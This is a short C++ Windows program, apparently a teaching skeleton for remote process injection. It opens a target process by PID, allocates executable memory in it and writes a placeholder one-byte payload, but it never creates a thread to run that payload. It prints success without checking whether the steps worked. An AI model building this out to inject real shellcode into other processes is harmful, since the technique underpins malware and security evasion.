#include <windows.h>
#include <iostream>

int main(int argc, char* argv[]) {
	DWORD PID = NULL;
	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	LPVOID rBuffer = NULL;
	unsigned char payload[] = "\x41";
	
	// Make sure an argument is supplied
	if (argc != 2) {
		printf("Usage: injection.exe <PID>\n");
		return EXIT_FAILURE;
	}

	// Set PID to supplied argument
	PID = atoi(argv[1]);
	printf("Opening a handle to process PID: %ld\n", PID);

	hProcess = OpenProcess(
		PROCESS_ALL_ACCESS, // Lets request all access
		FALSE, // Don't need to inherit handles
		PID // Supply our PID
	);

	if (hProcess == NULL) {
		printf("Failed to get handle to process!\n");
	}
	else {
		printf("Succesfully got handle to process\n");
	}

	rBuffer = VirtualAllocEx(
		hProcess, // Pass the handle of the target process
		NULL,
		sizeof(payload), // Supply the size of our payload
		MEM_RESERVE | MEM_COMMIT, // The type of allocation. We need to reserve and commit memory
		PAGE_EXECUTE_READWRITE // We need permission to read, write, and execute the payload we inject
	);
	printf("Succesfully allocated %zu bytes to process\n", sizeof(payload));

	WriteProcessMemory(
		hProcess, // Process handle
		rBuffer, // Pointer to base address
		payload, // Our actual payload
		sizeof(payload), // Size of our payload
		NULL
	);
	printf("Succesfully wrote %zu bytes to process at address 0x%p\n", sizeof(payload), rBuffer);

	return EXIT_SUCCESS;
}